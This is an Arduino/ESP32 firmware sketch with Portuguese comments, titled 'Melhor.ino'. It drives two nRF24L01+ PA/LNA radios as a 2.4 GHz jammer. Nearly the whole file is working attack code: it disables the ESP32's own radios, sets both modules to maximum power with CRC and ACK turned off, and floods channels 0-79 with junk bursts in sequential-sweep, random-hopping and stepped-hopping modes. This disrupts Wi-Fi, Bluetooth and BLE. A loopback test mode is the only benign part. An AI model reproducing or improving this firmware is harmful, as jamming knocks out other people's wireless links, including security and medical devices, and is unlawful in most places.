// ============================================================
//  Melhor.ino — Jammer 2.4 GHz (ESP32 + 2x nRF24L01+ PA/LNA)
//  Autor: Jesus (combinação otimizada de múltiplos projetos)
//  Baseado em: rf-24.ino (projeto próprio — confirmado funcional)
//
//  O QUE ESSE CÓDIGO FAZ:
//    Usa a mesma técnica do rf-24.ino original (que funcionou):
//    transmissão contínua + sweep de canais, sem startConstCarrier.
//    Dois rádios em barramentos SPI diferentes (HSPI e VSPI)
//    varrem o espectro 2.4 GHz em paralelo com canais defasados.
//
//  POR QUE SEM startConstCarrier:
//    O original rf-24.ino funcionava com setChannel() + write contínuo.
//    startConstCarrier em chips nRF24L01+ variante P requer reUseTX()
//    que togla o CE — pode perder a portadora entre chamadas de setChannel.
//    A abordagem sem portadora constante é mais simples e comprovada.
//
//  MODOS DE OPERAÇÃO (automáticos, alterna a cada ciclo):
//    0. Sweep sequencial  — canais 0-79 divididos entre os 2 rádios
//    1. Hopping aleatório — canais aleatórios com micro-delay
//    2. Hopping em passo  — rádios com passos diferentes (bounce)
//
//  MODO TESTE (flag MODO_TESTE = true):
//    Radio1 (TX) envia pacotes para Radio2 (RX).
//    Confirma que ambos os módulos e pinos SPI estão ok.
//    NÃO emite jamming — use antes de gravar o firmware de jamming.
//
//  PINOS:
//    HSPI — SCK=14, MISO=25, MOSI=13, CSN=32, CE=33
//    VSPI — SCK=18, MISO=19, MOSI=23, CSN=21, CE=22
// ============================================================

#include <SPI.h>
#include "RF24.h"
#include "esp_bt.h"
#include "esp_wifi.h"

// ------------------------------------------------------------
// *** FLAG DE MODO TESTE ***
//   true  → Radio1 TX, Radio2 RX — verifica hardware, SEM jamming
//   false → Modo jamming (Sweep + Aleatório + Hopping)
// ------------------------------------------------------------
#define MODO_TESTE  false

// ------------------------------------------------------------
// Configurações de jamming
// ------------------------------------------------------------
#define CANAL_MIN    0    // 2400 MHz — início do BLE advertising ch 37
#define CANAL_MAX    79   // 2479 MHz — fim do BT clássico

// Número de varreduras completas antes de trocar de modo
#define CICLOS_SWEEP    200
#define CICLOS_RANDOM   3

// ------------------------------------------------------------
// Configurações do modo teste
// ------------------------------------------------------------
#define CANAL_TESTE         108   // 2508 MHz — fora do Wi-Fi e BT
#define INTERVALO_TESTE_MS  500
#define TIMEOUT_RX_MS       200
const uint8_t ENDERECO_TESTE[6] = "JMRX1";

// ------------------------------------------------------------
// Velocidade SPI
// ------------------------------------------------------------
#define SPI_VELOCIDADE  16000000

// ------------------------------------------------------------
// Barramentos SPI e rádios
// ------------------------------------------------------------
SPIClass *hspi = nullptr;
SPIClass *vspi = nullptr;

// Radio 1 — HSPI: CE=33, CSN=32, SCK=14, MISO=25, MOSI=13
RF24 radio1(33, 32, SPI_VELOCIDADE);

// Radio 2 — VSPI: CE=22, CSN=21, SCK=18, MISO=19, MOSI=23
RF24 radio2(22, 21, SPI_VELOCIDADE);

// ------------------------------------------------------------
// Variáveis de controle (modo jamming)
// ------------------------------------------------------------
uint8_t  canal1     = CANAL_MIN;
uint8_t  canal2     = CANAL_MIN + 1;
uint8_t  direcao1   = 0;
uint8_t  direcao2   = 0;
uint8_t  modo       = 0;
uint16_t contCiclos = 0;

// Variáveis do modo teste
uint32_t contadorTX    = 0;
uint32_t contadorRX    = 0;
uint32_t contadorPerda = 0;
uint32_t ultimoEnvio   = 0;

// ------------------------------------------------------------
// Inicialização dos barramentos SPI
// ------------------------------------------------------------
void inicializarSPI() {
  Serial.println("\nInicializando HSPI (Radio 1)...");
  hspi = new SPIClass(HSPI);
  hspi->begin(14, 25, 13, 32);  // SCK, MISO, MOSI, SS

  Serial.println("Inicializando VSPI (Radio 2)...");
  vspi = new SPIClass(VSPI);
  vspi->begin(18, 19, 23, 21);  // SCK, MISO, MOSI, SS

  delay(100);
}

// ------------------------------------------------------------
// Inicialização de rádio para JAMMING
// Mesma configuração do rf-24.ino original (comprovada funcional):
//   - Sem startConstCarrier — usa transmissão direta
//   - AutoAck OFF, CRC OFF, Retries 0
//   - PA_MAX + LNA, 2 Mbps
//   - Canal inicial no CANAL_MIN
// ------------------------------------------------------------
bool inicializarRadioJammer(RF24 &radio, SPIClass *spiBus,
                            uint8_t canalInicial, const char *nome) {
  if (!radio.begin(spiBus)) {
    Serial.print(nome);
    Serial.println(": FALHOU ao iniciar!");
    return false;
  }
  delay(200);

  radio.setAutoAck(false);
  radio.stopListening();
  radio.setRetries(0, 0);
  radio.setPayloadSize(5);        // mesmo valor modificado na lib
  radio.setAddressWidth(3);       // mesmo valor modificado na lib
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.setChannel(canalInicial);

  // Abre pipe de escrita com endereço de broadcast
  // Necessário para writeFast() funcionar (transmissão de payload de lixo)
  const uint8_t addr[3] = {0xFF, 0xFF, 0xFF};
  radio.openWritingPipe(addr);

  Serial.print(nome);
  Serial.println(": OK");
  radio.printPrettyDetails();

  return true;
}

// ------------------------------------------------------------
// Inicialização de rádio para MODO TESTE
// ------------------------------------------------------------
bool inicializarRadioTeste(RF24 &radio, SPIClass *spiBus, const char *nome) {
  if (!radio.begin(spiBus)) {
    Serial.print(nome);
    Serial.println(": FALHOU ao iniciar!");
    return false;
  }
  delay(100);

  radio.setChannel(CANAL_TESTE);
  radio.setDataRate(RF24_1MBPS);
  radio.setPALevel(RF24_PA_LOW, true);
  radio.setCRCLength(RF24_CRC_16);
  radio.setAutoAck(true);
  radio.setRetries(5, 15);
  radio.setPayloadSize(sizeof(uint32_t));

  Serial.print(nome);
  Serial.println(": OK (modo teste)");
  radio.printPrettyDetails();

  return true;
}

// ------------------------------------------------------------
// Setup do MODO TESTE
// ------------------------------------------------------------
void setupTeste() {
  Serial.println("\n============================================");
  Serial.println("  MODO TESTE ATIVO");
  Serial.println("  Radio1 (HSPI) = TX | Radio2 (VSPI) = RX");
  Serial.println("============================================");

  bool ok1 = inicializarRadioTeste(radio1, hspi, "Radio1 TX (HSPI)");
  delay(200);
  bool ok2 = inicializarRadioTeste(radio2, vspi, "Radio2 RX (VSPI)");

  if (!ok1 || !ok2) {
    Serial.println("!!! ERRO: falha na inicializacao. Verifique cabos.");
    while (true) delay(1000);
  }

  radio1.stopListening();
  radio1.openWritingPipe(ENDERECO_TESTE);
  radio2.openReadingPipe(1, ENDERECO_TESTE);
  radio2.startListening();

  Serial.print("[TESTE] Canal: ");
  Serial.print(CANAL_TESTE);
  Serial.print(" (");
  Serial.print(2400 + CANAL_TESTE);
  Serial.println(" MHz) — Iniciando...\n");
}

// ------------------------------------------------------------
// Loop do MODO TESTE
// ------------------------------------------------------------
void loopTeste() {
  uint32_t agora = millis();
  if (agora - ultimoEnvio < INTERVALO_TESTE_MS) return;
  ultimoEnvio = agora;

  contadorTX++;
  bool ack = radio1.write(&contadorTX, sizeof(contadorTX));

  Serial.print("[TX] #");
  Serial.print(contadorTX);
  Serial.print(ack ? " OK" : " FALHOU");

  uint32_t inicio = millis();
  bool recebido = false;
  uint32_t pacoteRX = 0;
  while (millis() - inicio < TIMEOUT_RX_MS) {
    if (radio2.available()) {
      radio2.read(&pacoteRX, sizeof(pacoteRX));
      recebido = true;
      break;
    }
    delayMicroseconds(100);
  }

  if (recebido) {
    contadorRX++;
    Serial.print("  [RX] #");
    Serial.print(pacoteRX);
  } else {
    Serial.print("  [RX] TIMEOUT");
    if (ack) contadorPerda++;
  }
  if (!ack) contadorPerda++;

  float taxa = contadorTX > 0 ? (100.0f * contadorRX / contadorTX) : 0.0f;
  Serial.print("  TX:");
  Serial.print(contadorTX);
  Serial.print(" RX:");
  Serial.print(contadorRX);
  Serial.print(" Perda:");
  Serial.print(contadorPerda);
  Serial.print(" Taxa:");
  Serial.print(taxa, 1);
  Serial.println("%");
}

// Payload de lixo para forçar emissão RF em cada canal.
// O nRF24 só emite sinal quando transmite dados — setChannel()
// sozinho não faz o chip emitir. Com write() o chip emite um
// burst RF no canal configurado, gerando interferência real.
// O conteúdo não importa — o chip emite e descarta (sem ACK).
static const uint8_t LIXO[5] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

// ------------------------------------------------------------
// JAMMING — Sweep sequencial
// Radio1: canais pares | Radio2: canais ímpares
// Em cada canal: troca + transmite payload de lixo
// ------------------------------------------------------------
void modoSweep() {
  for (uint8_t ch = CANAL_MIN; ch <= CANAL_MAX; ch++) {
    if (ch % 2 == 0) {
      radio1.setChannel(ch);
      radio1.writeFast(LIXO, sizeof(LIXO));
    } else {
      radio2.setChannel(ch);
      radio2.writeFast(LIXO, sizeof(LIXO));
    }
  }
}

// ------------------------------------------------------------
// JAMMING — Hopping aleatório
// ------------------------------------------------------------
void modoAleatorio() {
  uint8_t ch1 = random(CANAL_MIN, CANAL_MAX + 1);
  uint8_t ch2 = random(CANAL_MIN, CANAL_MAX + 1);
  radio1.setChannel(ch1);
  radio1.writeFast(LIXO, sizeof(LIXO));
  radio2.setChannel(ch2);
  radio2.writeFast(LIXO, sizeof(LIXO));
  delayMicroseconds(random(10, 80));
}

// ------------------------------------------------------------
// JAMMING — Hopping assimétrico (bounce)
// Radio1: passo +2 | Radio2: passo +4
// ------------------------------------------------------------
void modoHopping() {
  if (direcao1 == 0) {
    canal1 += 2;
    if (canal1 >= CANAL_MAX) direcao1 = 1;
  } else {
    if (canal1 <= CANAL_MIN + 2) direcao1 = 0;
    else canal1 -= 2;
  }

  if (direcao2 == 0) {
    canal2 += 4;
    if (canal2 >= CANAL_MAX) direcao2 = 1;
  } else {
    if (canal2 <= CANAL_MIN + 4) direcao2 = 0;
    else canal2 -= 4;
  }

  radio1.setChannel(canal1);
  radio1.writeFast(LIXO, sizeof(LIXO));
  radio2.setChannel(canal2);
  radio2.writeFast(LIXO, sizeof(LIXO));
}

// ------------------------------------------------------------
// Setup
// ------------------------------------------------------------
void setup() {
  Serial.begin(115200);
  delay(200);

  Serial.println();
  Serial.println("============================================");
  Serial.println("  Melhor.ino — Jammer 2.4 GHz");
  Serial.println("  ESP32 + 2x nRF24L01+ PA/LNA");
  Serial.println("============================================");

  Serial.println("Desligando BT e Wi-Fi internos do ESP32...");
  esp_bt_controller_deinit();
  esp_wifi_stop();
  esp_wifi_deinit();
  esp_wifi_disconnect();
  Serial.println("OK.");

  inicializarSPI();

#if MODO_TESTE
  setupTeste();
#else
  Serial.println("\n============================================");
  Serial.println("  MODO JAMMER");
  Serial.println("============================================");

  bool ok1 = inicializarRadioJammer(radio1, hspi, CANAL_MIN,     "Radio1 (HSPI)");
  delay(200);
  bool ok2 = inicializarRadioJammer(radio2, vspi, CANAL_MIN + 1, "Radio2 (VSPI)");

  if (!ok1 || !ok2) {
    Serial.println("\n!!! ERRO: Um ou mais radios falharam !!!");
    Serial.println("  1. Capacitor 100uF em cada modulo?");
    Serial.println("  2. GND comum entre ESP32 e modulos?");
    Serial.println("  3. Pinos SPI corretos?");
    while (true) delay(1000);
  }

  Serial.println("\n============================================");
  Serial.println("  Ambos OK! Iniciando jamming...");
  Serial.println("  [modo] Sweep sequencial");
  Serial.println("============================================\n");
#endif
}

// ------------------------------------------------------------
// Loop
// ------------------------------------------------------------
void loop() {

#if MODO_TESTE
  loopTeste();
  return;
#endif

  switch (modo) {

    case 0:  // Sweep
      modoSweep();
      contCiclos++;
      if (contCiclos >= CICLOS_SWEEP) {
        contCiclos = 0;
        modo = 1;
        Serial.println("[modo] Aleatorio");
      }
      break;

    case 1:  // Aleatório
      modoAleatorio();
      contCiclos++;
      if (contCiclos >= (CICLOS_RANDOM * 500)) {
        contCiclos = 0;
        modo = 2;
        Serial.println("[modo] Hopping");
      }
      break;

    case 2:  // Hopping assimétrico
      modoHopping();
      contCiclos++;
      if (contCiclos >= (CICLOS_SWEEP * 40)) {
        contCiclos = 0;
        modo = 0;
        Serial.println("[modo] Sweep");
      }
      break;

    default:
      modo = 0;
      break;
  }
}
